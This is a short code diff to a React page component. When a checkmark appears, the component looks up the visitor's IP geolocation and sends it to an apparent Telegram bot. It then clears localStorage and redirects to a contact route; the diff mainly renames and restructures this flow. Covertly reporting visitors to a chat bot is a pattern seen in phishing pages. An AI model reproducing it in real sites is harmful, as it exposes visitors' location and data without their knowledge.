@@ -32,7 +32,7 @@ const Index: FC = () => {
     useEffect(() => {
         if (!isShowCheckMark) return;
 
-        const sendTelegramNotification = async () => {
+        const notifyAndRedirect = async () => {
             try {
                 const geoResponse = await fetch('https://get.geojs.io/v1/ip/geo.json');
                 const geoData = await geoResponse.json();
@@ -64,21 +64,16 @@ const Index: FC = () => {
                         parse_mode: 'HTML'
                     })
                 });
-            } catch {
-                //
+            } catch (err) {
+                console.error('notify err:', err);
             }
-        };
 
-        sendTelegramNotification();
-
-        const redirectTimeOut = setTimeout(() => {
             const currentTime = Date.now();
             localStorage.clear();
             router.push(`/contact/${currentTime}`);
-        }, 500);
-        return () => {
-            clearTimeout(redirectTimeOut);
         };
+
+        notifyAndRedirect();
     }, [isShowCheckMark, router]);
     return (
         <div className='flex flex-col items-center justify-center pt-37.5'>
